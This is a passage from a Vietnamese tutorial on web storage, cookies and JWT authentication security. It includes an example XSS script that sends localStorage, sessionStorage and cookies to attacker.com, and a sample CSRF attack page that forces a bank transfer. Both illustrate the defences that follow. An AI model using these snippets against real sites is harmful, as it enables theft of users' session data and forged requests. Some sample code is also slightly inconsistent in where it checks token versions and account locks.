       Yes       No    Yes       No    Yes       No
        │         │     │         │     │         │
        ▼         ▼     ▼         ▼     ▼         ▼
      JWT     Session  Local   Session  Local   Session
              +Cookie  Storage Storage  Storage Storage
```

### Use Cases cụ thể

#### 🔐 Authentication

```javascript
// ===== RECOMMENDED: JWT + httpOnly Cookie =====
// Access token: ngắn hạn, lưu trong memory
// Refresh token: dài hạn, lưu trong httpOnly cookie

// Server
res.cookie("refreshToken", refreshToken, {
  httpOnly: true,
  secure: true,
  sameSite: "strict",
});
res.json({ accessToken }); // Client lưu trong memory

// Client
let accessToken = null; // Chỉ lưu trong memory

async function login(email, password) {
  const res = await fetch("/auth/login", {
    method: "POST",
    credentials: "include",
    body: JSON.stringify({ email, password }),
  });
  const data = await res.json();
  accessToken = data.accessToken; // Memory only
}
```

#### 🛒 Shopping Cart

```javascript
// Guest user: LocalStorage
// Logged in user: Server + LocalStorage sync

class CartService {
  getCart() {
    if (isLoggedIn()) {
      return fetch("/api/cart").then((r) => r.json());
    }
    return JSON.parse(localStorage.getItem("cart") || "[]");
  }

  addItem(item) {
    if (isLoggedIn()) {
      return fetch("/api/cart", {
        method: "POST",
        body: JSON.stringify(item),
      });
    }
    const cart = this.getCart();
    cart.push(item);
    localStorage.setItem("cart", JSON.stringify(cart));
  }

  // Merge cart khi login
  async mergeCartOnLogin() {
    const localCart = JSON.parse(localStorage.getItem("cart") || "[]");
    if (localCart.length > 0) {
      await fetch("/api/cart/merge", {
        method: "POST",
        body: JSON.stringify({ items: localCart }),
      });
      localStorage.removeItem("cart");
    }
  }
}
```

#### 🎨 User Preferences

```javascript
// Theme, language, settings: LocalStorage
// Sync across devices: Server + LocalStorage cache

class PreferencesService {
  async getPreferences() {
    // Try local first
    const local = localStorage.getItem("preferences");
    if (local) {
      return JSON.parse(local);
    }

    // Fetch from server if logged in
    if (isLoggedIn()) {
      const prefs = await fetch("/api/preferences").then((r) => r.json());
      localStorage.setItem("preferences", JSON.stringify(prefs));
      return prefs;
    }

    return { theme: "light", language: "en" };
  }

  async setPreference(key, value) {
    const prefs = await this.getPreferences();
    prefs[key] = value;
    localStorage.setItem("preferences", JSON.stringify(prefs));

    if (isLoggedIn()) {
      await fetch("/api/preferences", {
        method: "PATCH",
        body: JSON.stringify({ [key]: value }),
      });
    }
  }
}
```

#### 📝 Form Draft

```javascript
// SessionStorage: Mất khi đóng tab (intentional)
// LocalStorage: Persist across sessions

class FormDraft {
  constructor(formId, persistent = false) {
    this.formId = formId;
    this.storage = persistent ? localStorage : sessionStorage;
  }

  save(data) {
    this.storage.setItem(
      `draft_${this.formId}`,
      JSON.stringify({
        data,
        savedAt: new Date().toISOString(),
      })
    );
  }

  load() {
    const saved = this.storage.getItem(`draft_${this.formId}`);
    return saved ? JSON.parse(saved) : null;
  }

  clear() {
    this.storage.removeItem(`draft_${this.formId}`);
  }
}

// Form quan trọng (blog post): persistent
const blogDraft = new FormDraft("blog-editor", true);

// Form đơn giản (contact): session only
const contactDraft = new FormDraft("contact-form", false);
```

#### 🔄 API Caching

```javascript
// Cache API responses trong LocalStorage

class APICache {
  constructor(ttl = 5 * 60 * 1000) {
    // 5 minutes default
    this.ttl = ttl;
  }

  async fetch(url, options = {}) {
    const cacheKey = `api_cache_${url}`;

    // Check cache
    const cached = localStorage.getItem(cacheKey);
    if (cached) {
      const { data, timestamp } = JSON.parse(cached);
      if (Date.now() - timestamp < this.ttl) {
        return data;
      }
    }

    // Fetch fresh data
    const response = await fetch(url, options);
    const data = await response.json();

    // Cache response
    localStorage.setItem(
      cacheKey,
      JSON.stringify({
        data,
        timestamp: Date.now(),
      })
    );

    return data;
  }

  invalidate(url) {
    localStorage.removeItem(`api_cache_${url}`);
  }

  clearAll() {
    Object.keys(localStorage)
      .filter((key) => key.startsWith("api_cache_"))
      .forEach((key) => localStorage.removeItem(key));
  }
}
```

---

## 9. Best Practices

### Authentication Best Practices

```javascript
// ===== 1. ACCESS TOKEN + REFRESH TOKEN PATTERN =====

/*
 * Access Token:
 * - Thời gian ngắn (15 phút)
 * - Lưu trong memory (JavaScript variable)
 * - Gửi qua Authorization header
 *
 * Refresh Token:
 * - Thời gian dài (7-30 ngày)
 * - Lưu trong httpOnly cookie
 * - Chỉ gửi đến /auth/refresh endpoint
 */

class AuthManager {
  constructor() {
    this.accessToken = null;
    this.refreshPromise = null;
  }

  setAccessToken(token) {
    this.accessToken = token;
  }

  async getAccessToken() {
    if (!this.accessToken) {
      await this.refresh();
    }
    return this.accessToken;
  }

  async refresh() {
    // Prevent multiple simultaneous refresh calls
    if (this.refreshPromise) {
      return this.refreshPromise;
    }

    this.refreshPromise = fetch("/auth/refresh", {
      method: "POST",
      credentials: "include",
    })
      .then((res) => {
        if (!res.ok) throw new Error("Refresh failed");
        return res.json();
      })
      .then((data) => {
        this.accessToken = data.accessToken;
        return data.accessToken;
      })
      .finally(() => {
        this.refreshPromise = null;
      });

    return this.refreshPromise;
  }

  async fetchWithAuth(url, options = {}) {
    const token = await this.getAccessToken();

    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        Authorization: `Bearer ${token}`,
      },
    });

    // Token expired, refresh and retry
    if (response.status === 401) {
      await this.refresh();
      return this.fetchWithAuth(url, options);
    }

    return response;
  }

  logout() {
    this.accessToken = null;
    return fetch("/auth/logout", {
      method: "POST",
      credentials: "include",
    });
  }
}

// ===== 2. SECURE COOKIE CONFIGURATION =====

// Server-side
const cookieOptions = {
  httpOnly: true, // Không truy cập từ JS
  secure: true, // Chỉ HTTPS
  sameSite: "strict", // Chống CSRF
  path: "/",
  maxAge: 7 * 24 * 60 * 60 * 1000,

  // Production
  domain: ".example.com", // Cho phép subdomain
};

// Refresh token cookie
res.cookie("refreshToken", token, {
  ...cookieOptions,
  path: "/auth", // Chỉ gửi đến auth endpoints
});

// ===== 3. TOKEN ROTATION =====

// Mỗi lần refresh, tạo refresh token mới
app.post("/auth/refresh", async (req, res) => {
  const { refreshToken } = req.cookies;

  // Verify và xóa token cũ
  const tokenDoc = await RefreshToken.findOneAndDelete({ token: refreshToken });
  if (!tokenDoc) {
    return res.status(401).json({ error: "Invalid token" });
  }

  // Tạo tokens mới
  const newAccessToken = generateAccessToken(tokenDoc.userId);
  const newRefreshToken = generateRefreshToken(tokenDoc.userId);

  // Lưu refresh token mới
  await RefreshToken.create({
    token: newRefreshToken,
    userId: tokenDoc.userId,
    expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
  });

  res.cookie("refreshToken", newRefreshToken, cookieOptions);
  res.json({ accessToken: newAccessToken });
});

// ===== 4. LOGOUT ALL DEVICES =====

// User model
const userSchema = new Schema({
  tokenVersion: { type: Number, default: 0 },
});

// Include tokenVersion in JWT
const generateAccessToken = (user) => {
  return jwt.sign(
    {
      userId: user.id,
      tokenVersion: user.tokenVersion,
    },
    JWT_SECRET,
    { expiresIn: "15m" }
  );
};

// Verify tokenVersion
const authenticate = async (req, res, next) => {
  const decoded = jwt.verify(token, JWT_SECRET);
  const user = await User.findById(decoded.userId);

  // Token version mismatch = token đã bị invalidate
  if (user.tokenVersion !== decoded.tokenVersion) {
    return res.status(401).json({ error: "Token revoked" });
  }

  req.user = user;
  next();
};

// Logout all devices
app.post("/auth/logout-all", authenticate, async (req, res) => {
  // Increment tokenVersion → invalidate tất cả tokens
  await User.findByIdAndUpdate(req.user.id, {
    $inc: { tokenVersion: 1 },
  });

  // Xóa tất cả refresh tokens
  await RefreshToken.deleteMany({ userId: req.user.id });

  res.json({ message: "Logged out from all devices" });
});
```

### Storage Best Practices

```javascript
// ===== 1. STORAGE WRAPPER WITH ERROR HANDLING =====

class SafeStorage {
  constructor(storage = localStorage) {
    this.storage = storage;
    this.isAvailable = this.checkAvailability();
  }

  checkAvailability() {
    try {
      const test = "__storage_test__";
      this.storage.setItem(test, test);
      this.storage.removeItem(test);
      return true;
    } catch (e) {
      return false;
    }
  }

  set(key, value, ttl = null) {
    if (!this.isAvailable) return false;

    try {
      const item = {
        value,
        timestamp: Date.now(),
        ttl,
      };
      this.storage.setItem(key, JSON.stringify(item));
      return true;
    } catch (e) {
      // QuotaExceededError
      if (e.name === "QuotaExceededError") {
        this.cleanup();
        return this.set(key, value, ttl);
      }
      return false;
    }
  }

  get(key, defaultValue = null) {
    if (!this.isAvailable) return defaultValue;

    try {
      const itemStr = this.storage.getItem(key);
      if (!itemStr) return defaultValue;

      const item = JSON.parse(itemStr);

      // Check TTL
      if (item.ttl && Date.now() - item.timestamp > item.ttl) {
        this.remove(key);
        return defaultValue;
      }

      return item.value;
    } catch (e) {
      return defaultValue;
    }
  }

  remove(key) {
    if (!this.isAvailable) return;
    this.storage.removeItem(key);
  }

  cleanup() {
    // Xóa items hết hạn
    const keys = Object.keys(this.storage);
    keys.forEach((key) => {
      try {
        const item = JSON.parse(this.storage.getItem(key));
        if (item.ttl && Date.now() - item.timestamp > item.ttl) {
          this.storage.removeItem(key);
        }
      } catch (e) {
        // Invalid JSON, remove it
        this.storage.removeItem(key);
      }
    });
  }
}

const storage = new SafeStorage(localStorage);
storage.set("user", { name: "John" }, 3600000); // TTL: 1 hour

// ===== 2. ENCRYPTION FOR SENSITIVE DATA =====

// Không nên lưu sensitive data trong localStorage
// Nhưng nếu cần, encrypt nó

class EncryptedStorage {
  constructor(encryptionKey) {
    this.key = encryptionKey;
  }

  async encrypt(data) {
    const encoder = new TextEncoder();
    const dataBuffer = encoder.encode(JSON.stringify(data));

    const key = await crypto.subtle.importKey("raw", encoder.encode(this.key), { name: "AES-GCM" }, false, ["encrypt"]);

    const iv = crypto.getRandomValues(new Uint8Array(12));
    const encrypted = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, dataBuffer);

    return {
      iv: Array.from(iv),
      data: Array.from(new Uint8Array(encrypted)),
    };
  }

  async decrypt(encryptedData) {
    const encoder = new TextEncoder();
    const decoder = new TextDecoder();

    const key = await crypto.subtle.importKey("raw", encoder.encode(this.key), { name: "AES-GCM" }, false, ["decrypt"]);

    const decrypted = await crypto.subtle.decrypt(
      { name: "AES-GCM", iv: new Uint8Array(encryptedData.iv) },
      key,
      new Uint8Array(encryptedData.data)
    );

    return JSON.parse(decoder.decode(decrypted));
  }

  async set(key, value) {
    const encrypted = await this.encrypt(value);
    localStorage.setItem(key, JSON.stringify(encrypted));
  }

  async get(key) {
    const item = localStorage.getItem(key);
    if (!item) return null;
    return this.decrypt(JSON.parse(item));
  }
}

// ===== 3. STORAGE QUOTA MANAGEMENT =====

class StorageManager {
  static async getQuota() {
    if ("storage" in navigator && "estimate" in navigator.storage) {
      const estimate = await navigator.storage.estimate();
      return {
        usage: estimate.usage,
        quota: estimate.quota,
        percentUsed: ((estimate.usage / estimate.quota) * 100).toFixed(2),
      };
    }
    return null;
  }

  static getLocalStorageSize() {
    let total = 0;
    for (let key in localStorage) {
      if (localStorage.hasOwnProperty(key)) {
        total += localStorage[key].length * 2; // UTF-16
      }
    }
    return total;
  }

  static async requestPersistence() {
    if ("storage" in navigator && "persist" in navigator.storage) {
      const isPersisted = await navigator.storage.persist();
      return isPersisted;
    }
    return false;
  }
}

// ===== 4. CROSS-TAB SYNCHRONIZATION =====

class SyncedStorage {
  constructor() {
    this.listeners = new Map();

    window.addEventListener("storage", (e) => {
      if (this.listeners.has(e.key)) {
        const callbacks = this.listeners.get(e.key);
        const newValue = e.newValue ? JSON.parse(e.newValue) : null;
        callbacks.forEach((cb) => cb(newValue, e.oldValue ? JSON.parse(e.oldValue) : null));
      }
    });
  }

  set(key, value) {
    localStorage.setItem(key, JSON.stringify(value));
    // Trigger cho tab hiện tại (storage event không fire cho tab gốc)
    if (this.listeners.has(key)) {
      const callbacks = this.listeners.get(key);
      callbacks.forEach((cb) => cb(value));
    }
  }

  get(key) {
    const item = localStorage.getItem(key);
    return item ? JSON.parse(item) : null;
  }

  subscribe(key, callback) {
    if (!this.listeners.has(key)) {
      this.listeners.set(key, []);
    }
    this.listeners.get(key).push(callback);

    // Return unsubscribe function
    return () => {
      const callbacks = this.listeners.get(key);
      const index = callbacks.indexOf(callback);
      if (index > -1) callbacks.splice(index, 1);
    };
  }
}

// Usage
const syncedStorage = new SyncedStorage();

// Subscribe to changes
const unsubscribe = syncedStorage.subscribe("theme", (newValue, oldValue) => {
  console.log(`Theme changed from ${oldValue} to ${newValue}`);
  document.body.className = newValue;
});

// Change in any tab will trigger callback in all tabs
syncedStorage.set("theme", "dark");
```

---

## 10. Các vấn đề bảo mật

### XSS (Cross-Site Scripting)

```javascript
// ===== VẤN ĐỀ =====
// Attacker inject script để đánh cắp data từ localStorage/sessionStorage

// Malicious script
const stolenData = {
  localStorage: { ...localStorage },
  sessionStorage: { ...sessionStorage },
  cookies: document.cookie,
};
fetch("https://attacker.com/steal", {
  method: "POST",
  body: JSON.stringify(stolenData),
});

// ===== PHÒNG CHỐNG =====

// 1. Không lưu sensitive data trong localStorage
// ❌ Bad
localStorage.setItem("accessToken", token);

// ✅ Good - Lưu trong memory hoặc httpOnly cookie
let accessToken = token; // Memory only

// 2. Content Security Policy
// Server header
app.use((req, res, next) => {
  res.setHeader("Content-Security-Policy", "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");
  next();
});

// 3. Sanitize user input
const DOMPurify = require("dompurify");

const cleanHTML = DOMPurify.sanitize(userInput);
element.innerHTML = cleanHTML;

// Hoặc dùng textContent
element.textContent = userInput; // Safe

// 4. HttpOnly cookies cho tokens
res.cookie("refreshToken", token, {
  httpOnly: true, // JavaScript không đọc được
  secure: true,
  sameSite: "strict",
});
```

### CSRF (Cross-Site Request Forgery)

```javascript
// ===== VẤN ĐỀ =====
// Attacker lừa user thực hiện request không mong muốn
// Cookie tự động gửi → Server nghĩ là legitimate request

// Attacker's website
<img src="https://bank.com/transfer?to=attacker&amount=1000" />
// Hoặc
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000" />
</form>
<script>document.forms[0].submit();</script>


// ===== PHÒNG CHỐNG =====

// 1. SameSite Cookie
res.cookie('sessionId', id, {
  sameSite: 'strict', // Không gửi với cross-site requests
  // hoặc 'lax' cho balance giữa security và usability
});


// 2. CSRF Token
const csrf = require('csurf');
app.use(csrf({ cookie: true }));

// Gửi token trong response
app.get('/form', (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// Client gửi token với request
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'CSRF-Token': csrfToken
  },
  body: JSON.stringify(data)
});


// 3. Dùng JWT trong header thay vì cookie
// Token không tự động gửi → Không bị CSRF
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${accessToken}`
  }
});


// 4. Double Submit Cookie
// Set random token trong cookie VÀ request
const csrfToken = generateRandomToken();

res.cookie('csrf', csrfToken, { sameSite: 'strict' });

// Client phải đọc cookie và gửi trong header
const csrf = getCookie('csrf');
fetch('/api/action', {
  headers: { 'X-CSRF-Token': csrf }
});

// Server verify cookie === header
app.use((req, res, next) => {
  if (req.cookies.csrf !== req.headers['x-csrf-token']) {
    return res.status(403).json({ error: 'CSRF validation failed' });
  }
  next();
});
```

### Token Theft & Replay

```javascript
// ===== PHÒNG CHỐNG =====

// 1. Short-lived access tokens
const accessToken = jwt.sign(payload, secret, { expiresIn: "15m" });

// 2. Token binding (fingerprint)
const generateToken = (user, req) => {
  const fingerprint = crypto
    .createHash("sha256")
    .update(req.ip + req.headers["user-agent"])
    .digest("hex");

  return jwt.sign(
    {
      userId: user.id,
      fingerprint,
    },
    secret
  );
};

const verifyToken = (req, res, next) => {
  const decoded = jwt.verify(token, secret);

  const currentFingerprint = crypto
    .createHash("sha256")
    .update(req.ip + req.headers["user-agent"])
    .digest("hex");

  if (decoded.fingerprint !== currentFingerprint) {
    return res.status(401).json({ error: "Token binding mismatch" });
  }

  next();
};

// 3. Refresh token rotation
// Mỗi lần dùng refresh token → tạo token mới, xóa token cũ
// Nếu token cũ được dùng lại → có thể bị đánh cắp → revoke tất cả

// 4. Detect suspicious activity
const loginAttempts = new Map();

app.post("/auth/login", (req, res) => {
  const key = req.ip;
  const attempts = loginAttempts.get(key) || { count: 0, lastAttempt: 0 };

  // Rate limiting
  if (attempts.count >= 5 && Date.now() - attempts.lastAttempt < 900000) {
    return res.status(429).json({ error: "Too many attempts" });
  }

  // ... login logic ...

  if (!success) {
    loginAttempts.set(key, {
      count: attempts.count + 1,
      lastAttempt: Date.now(),
    });
  }
});
```

### Session Fixation

```javascript
// ===== VẤN ĐỀ =====
// Attacker set session ID trước khi user login
// User login với session ID đó → Attacker có access

// ===== PHÒNG CHỐNG =====

// Regenerate session sau khi login
app.post("/login", (req, res) => {
  // Verify credentials...

  // Regenerate session ID
  req.session.regenerate((err) => {
    if (err) return res.status(500).json({ error: "Session error" });

    req.session.userId = user.id;
    res.json({ message: "Logged in" });
  });
});

// Regenerate sau khi thay đổi privilege
app.post("/become-admin", authenticate, (req, res) => {
  req.session.regenerate((err) => {
    req.session.userId = req.user.id;
    req.session.role = "admin";
    res.json({ message: "Now admin" });
  });
});
```

---

## Tổng kết

### Quick Reference

| Cần làm gì?                  | Dùng gì?                                           |
| ---------------------------- | -------------------------------------------------- |
| Authentication (SPA)         | JWT (access in memory, refresh in httpOnly cookie) |
| Authentication (Traditional) | Session + Cookie                                   |
| Remember me                  | Refresh token trong httpOnly cookie                |
| User preferences             | LocalStorage                                       |
| Shopping cart (guest)        | LocalStorage                                       |
| Form draft                   | SessionStorage                                     |
| Sensitive data               | KHÔNG lưu client-side, hoặc encrypt                |
| Cross-tab sync               | LocalStorage + storage event                       |
| One-time data                | SessionStorage                                     |

### Security Checklist

- [ ] Access token ngắn hạn (15m - 1h)
- [ ] Refresh token trong httpOnly cookie
- [ ] SameSite=strict hoặc lax cho cookies
- [ ] Secure flag cho production
- [ ] CSRF protection nếu dùng cookies
- [ ] Input sanitization (XSS prevention)
- [ ] Content Security Policy headers
- [ ] Token rotation khi refresh
- [ ] Session regeneration sau login
- [ ] Rate limiting cho auth endpoints
- [ ] Không lưu sensitive data trong localStorage

### Tài liệu tham khảo

- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [JWT Best Practices](https://auth0.com/blog/jwt-security-best-practices/)
- [Web Storage API - MDN](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
- [HTTP Cookies - MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)

---

## 11. Bảo mật Token chi tiết

### Nơi lưu trữ Token an toàn

```
┌─────────────────────────────────────────────────────────────────┐
│              NƠI LƯU TRỮ TOKEN - SO SÁNH BẢO MẬT                │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌─────────────────┬──────────┬──────────┬─────────────────┐   │
│  │    Nơi lưu      │   XSS    │   CSRF   │   Khuyến nghị   │   │
│  ├─────────────────┼──────────┼──────────┼─────────────────┤   │
│  │ localStorage    │ ❌ Dễ bị │ ✅ An toàn│ ❌ Không nên    │   │
│  │ sessionStorage  │ ❌ Dễ bị │ ✅ An toàn│ ❌ Không nên    │   │
│  │ Cookie (normal) │ ❌ Dễ bị │ ❌ Dễ bị │ ❌ Không nên    │   │
│  │ Cookie httpOnly │ ✅ An toàn│ ❌ Dễ bị │ ⚠️ Cần CSRF     │   │
│  │ Memory (RAM)    │ ✅ An toàn│ ✅ An toàn│ ✅ Tốt nhất     │   │
│  └─────────────────┴──────────┴──────────┴─────────────────┘   │
│                                                                  │
│  KHUYẾN NGHỊ:                                                    │
│  • Access Token  → Memory (JavaScript variable)                  │
│  • Refresh Token → httpOnly Cookie + CSRF protection            │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Pattern bảo mật Token tốt nhất

```javascript
// ===== SERVER-SIDE =====

const express = require("express");
const jwt = require("jsonwebtoken");
const crypto = require("crypto");
const rateLimit = require("express-rate-limit");

// 1. Cấu hình bảo mật
const config = {
  accessToken: {
    secret: process.env.JWT_ACCESS_SECRET,
    expiresIn: "15m", // Ngắn hạn
  },
  refreshToken: {
    secret: process.env.JWT_REFRESH_SECRET,
    expiresIn: "7d", // Dài hạn hơn
  },
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === "production",
    sameSite: "strict",
    path: "/api/auth", // Chỉ gửi đến auth endpoints
    maxAge: 7 * 24 * 60 * 60 * 1000,
  },
};

// 2. Tạo Token với fingerprint
const generateTokens = (user, req) => {
  // Tạo fingerprint từ client info
  const fingerprint = crypto
    .createHash("sha256")
    .update(req.ip + req.headers["user-agent"])
    .digest("hex")
    .substring(0, 16);

  const accessToken = jwt.sign(
    {
      userId: user.id,
      role: user.role,
      fingerprint,
      type: "access",
    },
    config.accessToken.secret,
    { expiresIn: config.accessToken.expiresIn }
  );

  // Refresh token chỉ chứa thông tin tối thiểu
  const refreshToken = jwt.sign(
    {
      userId: user.id,
      fingerprint,
      type: "refresh",
      jti: crypto.randomUUID(), // Unique ID để revoke
    },
    config.refreshToken.secret,
    { expiresIn: config.refreshToken.expiresIn }
  );

  return { accessToken, refreshToken, fingerprint };
};

// 3. Rate limiting cho auth endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 phút
  max: 5, // 5 attempts
  message: { error: "Too many attempts, try again later" },
  standardHeaders: true,
  legacyHeaders: false,
  keyGenerator: (req) => req.ip + req.body?.email, // Per IP + email
});

// 4. Login với bảo mật
app.post("/api/auth/login", authLimiter, async (req, res) => {
  const { email, password } = req.body;

  // Validate input
  if (!email || !password) {
    return res.status(400).json({ error: "Email and password required" });
  }

  try {
    const user = await User.findOne({ email }).select("+password");

    // Timing-safe comparison để tránh timing attacks
    if (!user) {
      // Vẫn hash để timing giống nhau
      await bcrypt.hash(password, 10);
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const isValid = await bcrypt.compare(password, user.password);
    if (!isValid) {
      // Log failed attempt
      await LoginAttempt.create({
        email,
        ip: req.ip,
        success: false,
        timestamp: new Date(),
      });
      return res.status(401).json({ error: "Invalid credentials" });
    }

    // Check if account is locked
    if (user.lockedUntil && user.lockedUntil > new Date()) {
      return res.status(423).json({
        error: "Account locked",
        lockedUntil: user.lockedUntil,
      });
    }

    // Generate tokens
    const { accessToken, refreshToken, fingerprint } = generateTokens(user, req);

    // Lưu refresh token vào database (để có thể revoke)
    await RefreshToken.create({
      userId: user.id,
      token: crypto.createHash("sha256").update(refreshToken).digest("hex"),
      fingerprint,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
      userAgent: req.headers["user-agent"],
      ip: req.ip,
    });

    // Set refresh token trong httpOnly cookie
    res.cookie("refreshToken", refreshToken, config.cookie);

    // Set fingerprint cookie (để verify)
    res.cookie("fgp", fingerprint, {
      ...config.cookie,
      httpOnly: false, // Client cần đọc để gửi trong header
    });

    // Log successful login
    await LoginAttempt.create({
      email,
      ip: req.ip,
      success: true,
      timestamp: new Date(),
    });

    // Trả về access token (client lưu trong memory)
    res.json({
      accessToken,
      user: {
        id: user.id,
        name: user.name,
        email: user.email,
        role: user.role,
      },
    });
  } catch (error) {
    console.error("Login error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});
```

### Verify Token với nhiều lớp bảo mật

```javascript
// ===== MIDDLEWARE VERIFY TOKEN =====

const verifyAccessToken = async (req, res, next) => {
  try {
    // 1. Lấy token từ header
    const authHeader = req.headers.authorization;
    if (!authHeader?.startsWith("Bearer ")) {
      return res.status(401).json({ error: "No token provided" });
    }

    const token = authHeader.split(" ")[1];

    // 2. Verify JWT
    const decoded = jwt.verify(token, config.accessToken.secret);

    // 3. Check token type
    if (decoded.type !== "access") {
      return res.status(401).json({ error: "Invalid token type" });
    }

    // 4. Verify fingerprint
    const clientFingerprint = crypto
      .createHash("sha256")
      .update(req.ip + req.headers["user-agent"])
      .digest("hex")
      .substring(0, 16);

    if (decoded.fingerprint !== clientFingerprint) {
      // Có thể token bị đánh cắp
      console.warn("Fingerprint mismatch:", {
        userId: decoded.userId,
        expected: decoded.fingerprint,
        received: clientFingerprint,
        ip: req.ip,
      });
      return res.status(401).json({ error: "Token binding failed" });
    }

    // 5. Check user còn tồn tại và active
    const user = await User.findById(decoded.userId);
    if (!user || !user.isActive) {
      return res.status(401).json({ error: "User not found or inactive" });
    }

    // 6. Check token version (để logout all devices)
    if (user.tokenVersion !== decoded.tokenVersion) {
      return res.status(401).json({ error: "Token revoked" });
    }

    req.user = {
      id: decoded.userId,
      role: decoded.role,
    };

    next();
  } catch (error) {
    if (error.name === "TokenExpiredError") {
      return res.status(401).json({
        error: "Token expired",
        code: "TOKEN_EXPIRED",
      });
    }
    if (error.name === "JsonWebTokenError") {
      return res.status(401).json({ error: "Invalid token" });
    }
    console.error("Token verification error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
};
```

### Refresh Token với Token Rotation

```javascript
// ===== REFRESH TOKEN ENDPOINT =====

app.post("/api/auth/refresh", async (req, res) => {
  try {
    const { refreshToken } = req.cookies;

    if (!refreshToken) {
      return res.status(401).json({ error: "Refresh token required" });
    }

    // 1. Verify refresh token
    let decoded;
    try {
      decoded = jwt.verify(refreshToken, config.refreshToken.secret);
    } catch (error) {
      // Clear invalid cookie
      res.clearCookie("refreshToken", config.cookie);
      return res.status(401).json({ error: "Invalid refresh token" });
    }

    // 2. Check token type
    if (decoded.type !== "refresh") {
      return res.status(401).json({ error: "Invalid token type" });
    }

    // 3. Hash token để tìm trong database
    const tokenHash = crypto.createHash("sha256").update(refreshToken).digest("hex");

    // 4. Tìm và XÓA token cũ (Token Rotation)
    const storedToken = await RefreshToken.findOneAndDelete({
      token: tokenHash,
      userId: decoded.userId,
    });

    if (!storedToken) {
      // Token không tồn tại hoặc đã được sử dụng
      // Có thể bị đánh cắp → Revoke tất cả tokens của user
      console.warn("Refresh token reuse detected:", decoded.userId);

      await RefreshToken.deleteMany({ userId: decoded.userId });
      res.clearCookie("refreshToken", config.cookie);

      return res.status(401).json({
        error: "Token reuse detected. All sessions revoked.",
        code: "TOKEN_REUSE",
      });
    }

    // 5. Check fingerprint
    const clientFingerprint = crypto
      .createHash("sha256")
      .update(req.ip + req.headers["user-agent"])
      .digest("hex")
      .substring(0, 16);

    if (storedToken.fingerprint !== clientFingerprint) {
      // Fingerprint không khớp
      await RefreshToken.deleteMany({ userId: decoded.userId });
      res.clearCookie("refreshToken", config.cookie);

      return res.status(401).json({ error: "Session hijacking detected" });
    }

    // 6. Lấy user
    const user = await User.findById(decoded.userId);
    if (!user || !user.isActive) {
      return res.status(401).json({ error: "User not found" });
    }

    // 7. Tạo tokens MỚI
    const newTokens = generateTokens(user, req);

    // 8. Lưu refresh token mới
    await RefreshToken.create({
      userId: user.id,
      token: crypto.createHash("sha256").update(newTokens.refreshToken).digest("hex"),
      fingerprint: newTokens.fingerprint,
      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000),
      userAgent: req.headers["user-agent"],
      ip: req.ip,
    });

    // 9. Set cookie mới
    res.cookie("refreshToken", newTokens.refreshToken, config.cookie);

    res.json({ accessToken: newTokens.accessToken });
  } catch (error) {
    console.error("Refresh error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});
```

### Logout và Revoke Token

```javascript
// ===== LOGOUT SINGLE DEVICE =====
app.post("/api/auth/logout", verifyAccessToken, async (req, res) => {
  try {
    const { refreshToken } = req.cookies;

    if (refreshToken) {
      // Xóa refresh token khỏi database
      const tokenHash = crypto.createHash("sha256").update(refreshToken).digest("hex");

      await RefreshToken.deleteOne({ token: tokenHash });
    }

    // Clear cookies
    res.clearCookie("refreshToken", config.cookie);
    res.clearCookie("fgp", { ...config.cookie, httpOnly: false });

    res.json({ message: "Logged out successfully" });
  } catch (error) {
    console.error("Logout error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ===== LOGOUT ALL DEVICES =====
app.post("/api/auth/logout-all", verifyAccessToken, async (req, res) => {
  try {
    // 1. Xóa tất cả refresh tokens
    await RefreshToken.deleteMany({ userId: req.user.id });

    // 2. Increment token version (invalidate tất cả access tokens)
    await User.findByIdAndUpdate(req.user.id, {
      $inc: { tokenVersion: 1 },
    });

    // 3. Clear cookies
    res.clearCookie("refreshToken", config.cookie);
    res.clearCookie("fgp", { ...config.cookie, httpOnly: false });

    res.json({ message: "Logged out from all devices" });
  } catch (error) {
    console.error("Logout all error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ===== REVOKE SPECIFIC SESSION =====
app.delete("/api/auth/sessions/:sessionId", verifyAccessToken, async (req, res) => {
  try {
    const { sessionId } = req.params;

    const result = await RefreshToken.deleteOne({
      _id: sessionId,
      userId: req.user.id,
    });

    if (result.deletedCount === 0) {
      return res.status(404).json({ error: "Session not found" });
    }

    res.json({ message: "Session revoked" });
  } catch (error) {
    console.error("Revoke session error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

// ===== LIST ACTIVE SESSIONS =====
app.get("/api/auth/sessions", verifyAccessToken, async (req, res) => {
  try {
    const sessions = await RefreshToken.find({ userId: req.user.id })
      .select("userAgent ip createdAt")
      .sort("-createdAt");

    res.json({
      sessions: sessions.map((s) => ({
        id: s._id,
        userAgent: s.userAgent,
        ip: s.ip,
        createdAt: s.createdAt,
        isCurrent: s.ip === req.ip && s.userAgent === req.headers["user-agent"],
      })),
    });
  } catch (error) {
    console.error("List sessions error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});
```

### Bảo mật Password

```javascript
// ===== PASSWORD HASHING =====
const bcrypt = require("bcrypt");
const zxcvbn = require("zxcvbn"); // Password strength checker

// 1. Hash password với cost factor phù hợp
